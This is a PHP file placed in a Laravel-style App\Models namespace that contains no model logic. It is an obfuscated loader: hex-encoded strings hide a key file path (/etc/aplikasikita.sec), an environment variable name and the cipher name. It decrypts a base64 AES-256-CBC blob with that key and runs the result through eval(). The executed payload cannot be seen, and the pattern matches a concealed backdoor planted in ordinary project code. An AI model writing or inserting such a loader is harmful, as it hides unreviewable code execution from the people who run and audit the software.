<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('4NZYyDkyNm8BNr9BgWy+Nw==');

$c=base64_decode(

'ATnVi2bGFjkg7eXiM6MCdx/3tyhBMywwjrY9ve9PIRK011h22CGSM29z0tZ6jxjTsKa93VyVtoJE' .
'LMz+ZNZJq/9yfvkD65uF61mNuoLrqq/hy84jEoZnV+JV7EH6rPzQ4Vswi+xQxOKTn2OeWqYnEEMm' .
'wbwIKRcikmW1f4lFCluFH8KNR8dCjmOLAHU/bwhIJXCxp2OlnPhzOy9E+u5dcGDXU9HoGe/fIbZ4' .
'+jTdgmy8zQ1ZmgQhGTarTWYXGxHzfPj8DEp+TTnve+d9mfV8qsqcXZip0gJuFChoZgykHAKKMNB5' .
'jRV9ECvdpdrnX9FH2+0mDub+o0we+P4vWlOK+MFp05wSm4xk7xXCxYmyhDw1/HKPxQrpdWq2vihw' .
'3bQFTkaFrCTjxpCRvYxTBrKOKOfn46itTsBKAZaUncn87ZreaeK9+QDXh/2BpSYwhcjlYFzXdhfr' .
'nlMjWRNcDok2qEtBAjABaPozU9h2m16TFy6jbUXtRSI9F85N5Up7pNOknnnCZIUybnS8M8xdKxJr' .
'pbE0NV6OIgkhpbM+JuX80vclOM+iFsV/W2oiu0S3isehIiccQ/91d3XmkWxlAWFW4PdNE3/CKIJQ' .
'lYlFYnMBUL/cz7RHD8+qqfehGKBRKGW0hnIsZvSrnwN2DM/aAlfahoWJfyeEyWEjZ+aVpbWgRubT' .
'SkdcJNUpSAjJDrFUuFYXpo+egjjs0gJzUvDCJ4MIQKjgO1n/F8ppvLBUIMVLlEYSLww7uHubHdgH' .
'z9f7oLhJEdMq8E8/8Qe/bclpOwQsxQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

